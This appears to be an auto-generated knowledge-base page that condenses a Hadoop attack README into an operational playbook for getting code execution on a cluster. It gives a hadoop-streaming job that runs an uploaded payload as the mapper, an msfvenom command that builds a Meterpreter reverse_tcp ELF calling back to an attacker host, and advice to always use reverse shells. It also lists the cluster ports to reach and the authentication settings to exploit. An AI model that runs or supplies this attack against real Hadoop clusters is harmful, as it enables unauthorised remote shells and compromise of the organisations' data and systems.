---
title: "Trained Knowledge & Topology: Hadoop_README.md"
tags:
  - https
  - initial_access_exploitation
  - kerberos
  - mdp
  - msfvenom
  - text
  - trained
source_file: Hadoop_README.md
doc_type: text
updated: 2026-10-24 00:58:24
---

# Trained Knowledge & Architecture: `Hadoop_README.md`

- **Source Path:** `~/Projects/CORA/Training/Hadoop_README.md` (`text`)
- **Extracted Technical Entities:** `https, kerberos, msfvenom`
- **Extracted IPs / Subnets:** `None`
- **Extracted Interfaces:** `None`
- **Linked Command Playbook:** [[commands/trained_hadoop_readme]] (`1` CEGAR-verified commands | `1` MDP transitions)

## Command & Tactic Coverage Summary
- **Total CEGAR-Verified Commands:** `1` (full executable list in [[commands/trained_hadoop_readme]])
- **Tactic Distribution:** `Initial_Access_Exploitation` (1)
- **Top Extracted CLI Tools:** `msfvenom` (1)

## LLM Distilled Operational Summary
### Key Operational Techniques & Decision Workflows

*   **Authentication Selection**: Determine cluster auth mode before execution. Use `HADOOP_USER_NAME` for simple auth; obtain valid Kerberos tickets for "Hadoop Secure Mode".
*   **Payload Strategy**: Due to MapReduce's distributed nature, node affinity is non-deterministic. Always use a `reverse_shell` payload (e.g., Meterpreter or plain `reverse_tcp`) and wait for the connection rather than expecting an interactive forward shell.
*   **Job Submission Workflow**:
    1.  Navigate to the Hadoop binaries directory (e.g., `/opt/hadoop-2.7.3/`).
    2.  Upload the executable payload to HDFS using the `-file` flag.
    3.  Submit the job via `hadoop-streaming` with `-mapper` pointing to the HDFS path and `-reducer NONE`.
    4.  Add distribution-specific parameters (e.g., `-Dhdp.version=<version>`) if required by vendors like HortonWorks.
    5.  Use the `-background` flag to detach and start a listener.
*   **Verification**: Check the output directory for `_SUCCESS` or failure, then retrieve results via `hadoop fs -cat`.

### Critical Command Patterns & Required Flags

*   **Core Execution Command**:
    ```bash
    hadoop jar share/hadoop/tools/lib/hadoop-streaming-2.7.3.jar \
      -input <hdfs://path/to/input> \
      -output <hdfs://path/to/output> \
      -mapper "<command_or_path_to_executable>" \
      -reducer NONE \
      -file <local_path_to_payload> \
      -background
    ```
*   **Payload Generation (Meterpreter)**:
    ```bash
    msfvenom -a x86 --platform linux -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> -f elf -o msf.payload
    ```
*   **Result Retrieval**:
    ```bash
    hadoop fs -ls <output_dir>
    hadoop fs -cat <output_dir>/part-00000
    ```

### Network Topology & Service Relationships

*   **YARN ResourceManager**: Ports 8030, 8031, 8032, 8033, or 8050.
*   **NameNode (Metadata)**: Port 8020 (used for browsing HDFS).
*   **DataNode (Data Transfer)**: Port 50010 (used for uploading/downloading files like the payload).
*   **Topology Constraint**: Payload execution location is random across cluster nodes; no specific IP can be targeted beforehand.

## Extracted Operational Steps & Workflows
- 1. A **working attack environment**: Hadoop binaries and the target cluster configuration are needed. Follow the following tutorials to set them up:
- 2. Then you need to be able to access the following **Hadoop services through the network**:
- 3. Finally you have to look up which **authentication level** is deployed, the cluster you are attacking might have:
- 1. Go to the directory where you decompressed Hadoop binaries (`/opt` in the tutorial):
- 2. Call the Hadoop streaming utility:

